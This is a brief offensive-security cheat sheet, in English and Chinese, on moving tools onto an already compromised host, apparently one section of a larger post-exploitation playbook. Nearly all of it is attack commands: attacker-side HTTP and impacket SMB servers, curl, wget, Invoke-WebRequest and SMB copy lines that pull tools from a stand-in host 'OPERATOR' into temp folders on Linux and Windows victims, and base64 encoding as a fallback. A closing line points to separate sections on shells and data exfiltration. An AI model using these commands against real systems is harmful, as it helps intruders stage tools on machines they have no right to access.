# File Exchange from an Existing Foothold

## 1. HTTP

攻击端：

```bash
python3 -m http.server 8000 --bind 0.0.0.0
```

Linux：

```bash
curl -f http://OPERATOR:8000/tool -o /tmp/tool
wget http://OPERATOR:8000/tool -O /tmp/tool
```

Windows：

```powershell
curl.exe http://OPERATOR:8000/tool.exe -o C:\Windows\Temp\tool.exe
Invoke-WebRequest http://OPERATOR:8000/tool.exe -OutFile C:\Windows\Temp\tool.exe
```

## 2. SMB

攻击端：

```bash
impacket-smbserver share ./share -smb2support
```

Windows：

```cmd
copy \\OPERATOR\share\tool.exe C:\Windows\Temp\tool.exe
```

## 3. base64 fallback

Linux：

```bash
base64 -w0 file.bin
```

Windows PowerShell：

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes('file.bin'))
```

## 4. 边界

工具交换属于 `/shell`；大规模数据 staging/exfiltration 属于 `/post`。
